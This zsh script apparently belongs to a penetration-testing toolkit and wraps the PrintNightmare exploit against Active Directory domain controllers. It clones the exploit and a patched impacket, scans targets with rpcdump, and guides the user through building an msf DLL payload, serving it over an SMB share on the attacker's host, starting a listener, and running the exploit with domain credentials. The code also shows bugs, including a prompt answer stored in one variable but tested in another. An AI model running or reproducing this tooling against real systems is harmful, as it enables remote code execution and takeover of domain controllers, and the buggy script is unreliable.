#!/usr/bin/env zsh

############################################################# 
# nb-ad-cve
#############################################################
nb-ad-cve-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-cve
----------
The nb-ad-cve namespace provides commands for popular active direcory CVEs vulnerabilities and exploits.

PrintNightmare
--------------
nb-ad-cve-printnightmare-install                   command to clone the github CVE repo install the cube0x0's version of impacket
nb-ad-cve-printnightmare-scan                      command to check for CVE-2021-34527 and CVE-2021-1675 vulnerability
nb-ad-cve-printnightmare-exploit                   command to exploit the PrintNightmare vulnerability 

DOC
}

nb-ad-cve-printnightmare-install() {
    __check-project

    __ask "This will clone the cube0x0 CVE github repo to downloads, continue? (y/n)"
    local cb && __askvar cb ANSWER

    if [[ $db == "y" ]]; then
      git clone https://github.com/cube0x0/CVE-2021-1675.git ~/downloads/CVE-2021-1675
    else
      __err "Operation cancelled by user"
      exit 1
    fi

    echo
    __ask "This will uninstall current version of impacket and installcube0x0's version of Impacket, continue? (y/n)"
    local im && __askvar im ANSWER

    if [[ $im == "y" ]]; then
      pip3 uninstall impacket
      git clone https://github.com/cube0x0/impacket ~/downloads/impacket
      cd ~/downloads/impacket
      python3 ./setup.py install
      cd ~/downloads/
    else
      __err "Operation cancelled by user"
      exit 1
    fi
}

nb-ad-cve-printnightmare-scan() {
    __check-project
    nb-vars-set-rhost

    print -z "rpcdump.py @${__RHOST} | egrep 'MS-RPRN|MS-PAR'"

    __info "If target is vulnerable, you can generate a dll payload:"
    __ok "nb-shell-handlers-msf-payload"
    __info "Then create a share with smbserver.py:"
    __ok "sudo smbserver.py -smb2support CompData payload.dll"
    __info "Then configure & start msf multi/handler"
    __ok "nb-shell-handlers-msf-listener"
    __info "Then exploit the target with command:"
    __ok "nb-ad-cve-printnightmare-exploit"
}

nb-ad-cve-printnightmare-exploit() {
    __check-project
    __ask "Enter the IP of domain controller"
    nb-vars-set-dchost
    nb-vars-set-domain
    nb-vars-set-user
    nb-vars-set-pass
    nb-vars-set-lhost

    print -z "sudo python3 CVE-2021-1675.py ${__DOMAIN}/${__USER}:'${_PASS}'@${__DCHOST} '\\\\${__LHOST}\\CompData\\payload.dll'"
}
